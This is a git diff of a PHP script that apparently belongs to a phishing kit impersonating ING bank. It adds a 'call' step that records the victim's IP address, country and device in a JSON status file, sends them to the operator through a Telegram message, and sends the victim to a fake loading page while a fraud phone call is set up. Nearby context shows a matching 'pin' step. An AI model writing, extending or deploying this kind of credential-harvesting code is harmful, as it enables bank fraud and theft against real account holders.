@@ -51,6 +51,25 @@ include "../lib/UserInfo.php";
                 header("Location: loading.php?redirect=".random_int(1000000000,9999999999));
                 exit;
          }
+          if($_POST['step'] === 'call'){
+            $message =
+                "[+]——————[ ING ]——————[+]\r\n".
+                "👥 galak nadi ghir soner \r\n".
+                "📍 IP = ".$ip." | ".$geoplugin->countryCode."\r\n".
+                "📱 Device = " . $user->get_os() ."\r\n".
+                "[+]——————[ ING ]——————[+]\r\n";
+                
+                // change the status to wait
+                $data['status'] = 'wait';
+                
+                $json = json_encode($data, JSON_PRETTY_PRINT);
+                file_put_contents($filename, $json);
+                
+                telegram_message($message, $keyboard);
+                
+                header("Location: loadcall.php?redirect=".random_int(1000000000,9999999999));
+                exit;
+         }        
          if ($_POST['step'] === 'pin') {
             $message =
                 "[+]——————[ ING ]——————[+]\r\n".
